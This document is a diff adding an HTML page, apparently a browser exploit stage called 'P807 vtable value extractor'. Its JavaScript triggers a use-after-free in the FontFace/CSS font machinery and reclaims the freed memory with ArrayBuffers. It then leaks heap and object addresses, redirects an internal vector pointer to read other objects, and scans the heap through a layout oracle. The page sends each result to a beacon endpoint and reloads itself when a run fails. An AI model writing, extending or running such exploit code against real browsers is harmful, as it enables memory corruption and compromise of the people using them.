@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P807</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P807 vtable value extractor</pre>
+<script>
+'use strict';
+var B='';
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET',B+'/beacon.php?tag=P807-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,700))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;bn('LOG',s.slice(0,200));}
+
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+function hexQ(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return'0x'+(hi?(hi.toString(16)+('00000000'+lo.toString(16)).slice(-8)):lo.toString(16));}
+function readU64(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return{hi:hi,lo:lo};}
+function writeU64(bv,off,hi,lo){bv.setUint32(off,lo,true);bv.setUint32(off+4,hi,true);}
+function addrStr(a){return'0x'+a.hi.toString(16)+('00000000'+a.lo.toString(16)).slice(-8);}
+
+bn('BOOT','v1');
+
+var uaf_ab=null,self_addr=null,q13_addr=null,all_abs=[];
+var face_ref=null; // keep JS ref to freed FontFace
+
+// ============ Phase A: UAF reclaim (P791-proven) ============
+function phaseA(cb){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+  face_ref=face; // KEEP reference to JS FontFace object after free
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      abs=[];
+      for(var i=0;i<64;i++)abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bb1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f1, bb1','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var bestI=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+      if(nz>bestNz){bestNz=nz;bestI=i;}
+    }
+    if(bestI<0||bestNz<4){
+      bn('A-MISS','nz='+bestNz);
+      setTimeout(function(){location.reload();},500);
+      return;
+    }
+    uaf_ab=abs[bestI];
+    all_abs=abs;
+    var dv=new DataView(uaf_ab);
+    var q11=readU64(dv,0x58);
+    if(q11.hi>0){
+      var borrow=(q11.lo<0x68)?1:0;
+      self_addr={hi:q11.hi-borrow,lo:(q11.lo-0x68)>>>0};
+      q13_addr=readU64(dv,0x68);
+      bn('A-HIT','i='+bestI+'|self='+addrStr(self_addr)+'|q13='+addrStr(q13_addr));
+      var dump='';
+      for(var q=0;q<24;q++){var v=hexQ(dv,q*8);if(v!=='0x0')dump+='q'+q+'='+v+'|';}
+      bn('A-DUMP',dump);
+      log('UAF OK: self='+addrStr(self_addr)+' q13='+addrStr(q13_addr));
+      cb();
+    } else {
+      bn('A-MISS','q11h='+q11.hi+'_nz='+bestNz);
+      setTimeout(function(){location.reload();},500);
+    }
+  },400);
+}
+
+// ============ Phase B: FontFace property access on freed object ============
+function phaseB(cb){
+  bn('B0','fontface_props');
+  log('Phase B: probing freed FontFace JS object...');
+  var props={};
+  try{props.status=face_ref.status;}catch(e){props.status='ERR:'+e.message;}
+  try{props.family=face_ref.family;}catch(e){props.family='ERR:'+e.message;}
+  try{props.style=face_ref.style;}catch(e){props.style='ERR:'+e.message;}
+  try{props.weight=face_ref.weight;}catch(e){props.weight='ERR:'+e.message;}
+  try{props.display=face_ref.display;}catch(e){props.display='ERR:'+e.message;}
+  try{props.loaded=typeof face_ref.loaded;}catch(e){props.loaded='ERR:'+e.message;}
+  try{props.variant=face_ref.variant;}catch(e){props.variant='ERR:'+e.message;}
+  try{props.unicodeRange=face_ref.unicodeRange;}catch(e){props.unicodeRange='ERR:'+e.message;}
+
+  var s='';for(var k in props)s+=k+'='+props[k]+'|';
+  bn('B1',s);
+  log('Props: '+s);
+
+  // B2: Try to read face_ref.loaded promise - it might access the C++ CSSFontFace
+  try{
+    face_ref.loaded.then(function(r){
+      bn('B2-RESOLVE','loaded_resolved='+typeof r);
+    }).catch(function(e){
+      bn('B2-REJECT','loaded_err='+e.message);
+    });
+  }catch(e){bn('B2-ERR',e.message);}
+
+  // B3: Try setting family - writes to freed CSSFontFace?
+  var dv=new DataView(uaf_ab);
+  var pre_q0=hexQ(dv,0),pre_q1=hexQ(dv,8);
+  try{face_ref.family='test123';}catch(e){bn('B3-ERR',e.message);}
+  var post_q0=hexQ(dv,0),post_q1=hexQ(dv,8);
+  bn('B3','fam_set|pre_q0='+pre_q0+'|post_q0='+post_q0+'|pre_q1='+pre_q1+'|post_q1='+post_q1);
+
+  // B4: Dump full AB after property access
+  var dump='';
+  for(var q=0;q<24;q++){var v=hexQ(dv,q*8);if(v!=='0x0')dump+='q'+q+'='+v+'|';}
+  bn('B4',dump);
+
+  setTimeout(cb,300);
+}
+
+// ============ Phase C: Vector m_buffer redirect to read source memory ============
+function phaseC(cb){
+  bn('C0','vec_redirect');
+  log('Phase C: redirecting vector m_buffer to source...');
+  var dv=new DataView(uaf_ab);
+
+  // Save original vector fields
+  var orig_q11=readU64(dv,0x58);
+  var orig_q12_lo=dv.getUint32(0x60,true);
+  var orig_q12_hi=dv.getUint32(0x64,true);
+
+  // Set m_buffer = q13 (point at CSSFontFaceSource)
+  writeU64(dv,0x58,q13_addr.hi,q13_addr.lo);
+  // Set m_capacity = 16, m_size = 16
+  dv.setUint32(0x60,16,true); // m_capacity
+  dv.setUint32(0x64,16,true); // m_size
+
+  bn('C1','mbuf=q13|cap=16|size=16');
+
+  // Try accessing the vector through the FontFace CSS API
+  // document.fonts.check() might iterate the source list
+
+  // First, re-add face to fonts
+  try{document.fonts.add(face_ref);bn('C2-ADD','readded');}catch(e){bn('C2-ADD','err='+e.message);}
+
+  // Try fonts.check which accesses font face state
+  try{
+    var chk=document.fonts.check('1em f1');
+    bn('C2-CHK','check='+chk);
+  }catch(e){bn('C2-CHK','err='+e.message);}
+
+  // Try fonts.load which resolves fonts
+  try{
+    document.fonts.load('1em f1','A').then(function(r){
+      bn('C2-LOAD','resolved='+r.length);
+    }).catch(function(e){
+      bn('C2-LOAD','reject='+e.message);
+    });
+  }catch(e){bn('C2-LOAD','err='+e.message);}
+
+  // Dump AB after - check if any new values appeared
+  setTimeout(function(){
+    var dump='';
+    for(var q=0;q<24;q++){var v=hexQ(dv,q*8);if(v!=='0x0')dump+='q'+q+'='+v+'|';}
+    bn('C3',dump);
+
+    // Restore vector
+    writeU64(dv,0x58,orig_q11.hi,orig_q11.lo);
+    dv.setUint32(0x60,orig_q12_lo,true);
+    dv.setUint32(0x64,orig_q12_hi,true);
+
+    cb();
+  },500);
+}
+
+// ============ Phase D: BigUint64Array overlay on reclaimed AB ============
+function phaseD(cb){
+  bn('D0','bu64_overlay');
+  log('Phase D: BigUint64Array deep read...');
+
+  // Read ALL 24 qwords with BigUint64Array for full precision
+  var view=new BigUint64Array(uaf_ab);
+  var parts=[];
+  for(var q=0;q<24;q++){
+    if(view[q]!==BigInt(0)){
+      parts.push('q'+q+'=0x'+h16(view[q]));
+    }
+  }
+  // Split into beacon-sized chunks
+  var chunk='';
+  for(var i=0;i<parts.length;i++){
+    if(chunk.length+parts[i].length>650){bn('D1',chunk);chunk='';}
+    if(chunk.length>0)chunk+='|';
+    chunk+=parts[i];
+  }
+  if(chunk)bn('D1',chunk);
+  log('BU64: '+parts.join(' '));
+
+  // D2: Try creating a second FontFace and compare its q13
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}";
+  document.head.appendChild(st2);
+  var face2=new FontFace('f2',"local('Helvetica')",{unicodeRange:'U+0043'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired2)return undefined;
+      fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      abs2=[];
+      for(var k=0;k<64;k++)abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bb2');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f2, bb2','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var bestI2=-1,bestNz2=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+      if(nz>bestNz2){bestNz2=nz;bestI2=i;}
+    }
+    if(bestI2>=0&&bestNz2>=4){
+      var dv2=new DataView(abs2[bestI2]);
+      var q11_2=readU64(dv2,0x58);
+      var q13_2=readU64(dv2,0x68);
+      var borrow2=(q11_2.lo<0x68)?1:0;
+      var self2={hi:q11_2.hi-borrow2,lo:(q11_2.lo-0x68)>>>0};
+      bn('D2-HIT','self2='+addrStr(self2)+'|q13_2='+addrStr(q13_2)+'|dist='+
+        ((q13_2.hi===self2.hi)?(q13_2.lo-self2.lo):'cross'));
+
+      // D3: Compare q13 values - both are CSSFontFaceSource objects
+      // Same vtable, different instances
+      var q13_diff=(q13_2.hi===q13_addr.hi)?(q13_2.lo-q13_addr.lo):'cross_hi';
+      var self_diff=(self2.hi===self_addr.hi)?(self2.lo-self_addr.lo):'cross_hi';
+      bn('D3','q13_diff='+q13_diff+'|self_diff='+self_diff);
+      log('Pass2: self2='+addrStr(self2)+' q13_2='+addrStr(q13_2));
+      log('Diffs: q13_d='+q13_diff+' self_d='+self_diff);
+
+      // D4: Dump pass2 full qwords
+      var view2=new BigUint64Array(abs2[bestI2]);
+      var p2=[];
+      for(var q=0;q<24;q++){
+        if(view2[q]!==BigInt(0))p2.push('q'+q+'=0x'+h16(view2[q]));
+      }
+      bn('D4',p2.join('|'));
+    } else {
+      bn('D2-MISS','nz2='+bestNz2);
+    }
+    cb();
+  },400);
+}
+
+// ============ Phase E: Heap-relative address scan via oracle ============
+function phaseE(cb){
+  bn('E0','heap_scan');
+  log('Phase E: heap-relative oracle scan...');
+  var dv=new DataView(uaf_ab);
+
+  // Test addresses relative to self_addr: -1MB to +1MB in 64KB steps
+  // These should be in the heap region and mostly survive
+  var tests=[];
+  for(var delta=-0x100000;delta<=0x100000;delta+=0x10000){
+    var lo=(self_addr.lo+delta)>>>0;
+    var hi=self_addr.hi;
+    if(delta<0 && self_addr.lo<Math.abs(delta)){hi--; lo=(0x100000000+self_addr.lo+delta)>>>0;}
+    if(delta>0 && lo<self_addr.lo){hi++;}
+    tests.push({delta:delta,hi:hi,lo:lo});
+  }
+
+  var results=[];
+  var idx=0;
+
+  function nextTest(){
+    if(idx>=tests.length){
+      // Send results in chunks
+      var alive=[],dead=[];
+      for(var i=0;i<results.length;i++){
+        if(results[i].alive)alive.push(results[i].delta);
+        else dead.push(results[i].delta);
+      }
+      bn('E-ALIVE','count='+alive.length+'|'+alive.map(function(d){return(d>=0?'+':'')+d;}).join(','));
+      bn('E-DEAD','count='+dead.length);
+      log('Heap scan: '+alive.length+' alive, '+dead.length+' dead');
+      cb();
+      return;
+    }
+
+    var t=tests[idx];
+    writeU64(dv,0x08,t.hi,t.lo); // q1 = target
+
+    var span=document.createElement('span');
+    span.style.fontFamily='f1, serif';
+    span.textContent='E'+idx;
+    document.body.appendChild(span);
+    document.body.offsetHeight;
+
+    setTimeout(function(){
+      results.push({delta:t.delta,alive:true});
+      idx++;
+      nextTest();
+    },100); // Fast 100ms per test
+  }
+
+  nextTest();
+}
+
+// ============ Phase F: Wide address space probe (safe regions only) ============
+function phaseF(cb){
+  bn('F0','wide_scan');
+  log('Phase F: wide address space probe...');
+  var dv=new DataView(uaf_ab);
+
+  // Test specific address regions that are commonly used:
+  // 0x200000000 - userland code
+  // 0x400000000-0x900000000 - libraries
+  // 0x1000000000 - heap (we know this is alive)
+  // Try known-safe first, then expand
+
+  // Phase F1: Test if self_addr-based oracle works (calibration)
+  writeU64(dv,0x08,self_addr.hi,self_addr.lo);
+  var cal=document.createElement('span');
+  cal.style.fontFamily='f1, serif';
+  cal.textContent='Fcal';
+  document.body.appendChild(cal);
+  document.body.offsetHeight;
+
+  setTimeout(function(){
+    bn('F1','calibration_alive');
+
+    // F2: Test specific high-value address ranges
+    // Only test addresses with KNOWN patterns to avoid crashes
+    // Strategy: test 0x10_XXXXXXXX range (our heap) at 1MB steps
+    var heapTests=[];
+    for(var mb=0;mb<256;mb++){
+      heapTests.push({
+        hi:0x10,
+        lo:mb*0x100000,
+        label:'0x10_'+('00000000'+(mb*0x100000).toString(16)).slice(-8)
+      });
+    }
+
+    var hIdx=0,hAlive=[];
+    function nextHeap(){
+      if(hIdx>=heapTests.length){
+        bn('F2','heap_pages='+hAlive.length+'|first='+
+          (hAlive.length>0?hAlive[0]:'none')+'|last='+
+          (hAlive.length>0?hAlive[hAlive.length-1]:'none'));
+        log('Heap map: '+hAlive.length+' alive 1MB pages');
+        cb();
+        return;
+      }
+      var t=heapTests[hIdx];
+      writeU64(dv,0x08,t.hi,t.lo);
+      var sp=document.createElement('span');
+      sp.style.fontFamily='f1, serif';
+      sp.textContent='.';
+      document.body.appendChild(sp);
+      document.body.offsetHeight;
+
+      setTimeout(function(){
+        hAlive.push(t.label);
+        hIdx++;
+        nextHeap();
+      },50); // Very fast - 50ms per test (heap pages should be safe)
+    }
+    nextHeap();
+  },200);
+}
+
+// ============ MAIN FLOW ============
+phaseA(function(){
+  setTimeout(function(){
+    phaseB(function(){
+      setTimeout(function(){
+        phaseC(function(){
+          setTimeout(function(){
+            phaseD(function(){
+              setTimeout(function(){
+                phaseE(function(){
+                  setTimeout(function(){
+                    phaseF(function(){
+                      bn('DONE','all_complete');
+                      log('\nDONE - all phases complete');
+                    });
+                  },100);
+                });
+              },100);
+            });
+          },100);
+        });
+      },100);
+    });
+  },100);
+});
+</script></body></html>
